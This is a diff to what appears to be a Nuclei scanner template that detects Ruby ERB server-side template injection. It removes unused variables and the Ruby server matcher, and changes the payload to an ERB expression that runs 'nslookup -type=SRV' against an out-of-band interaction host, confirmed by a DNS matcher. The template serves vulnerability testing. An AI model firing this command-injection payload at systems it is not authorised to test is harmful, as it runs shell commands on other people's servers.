@@ -12,12 +12,6 @@ info:
     verified: true
   tags: ssti,dast,oast,oob
 
-variables:
-  first: "{{rand_int(1000, 9999)}}"
-  second: "{{rand_int(1000, 9999)}}"
-  third: "{{rand_int(1000, 9999)}}"
-  result: "{{first}}{{second}}"
-
 http:
   - pre-condition:
       - type: dsl
@@ -26,7 +20,7 @@ http:
 
     payloads:
       injection:
-        - '<%25%3d(`nslookup+{{interactsh-url}}`)%25>'
+        - '<%25%3d(`nslookup+-type=SRV+{{interactsh-url}}`)%25>'
 
     fuzzing:
       - part: query
@@ -35,15 +29,10 @@ http:
         fuzz:
           - "{{injection}}"
 
-    matchers-condition: and
     matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: word
-        part: server
-        words:
-          - "WEBrick"
-          - "Ruby"
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
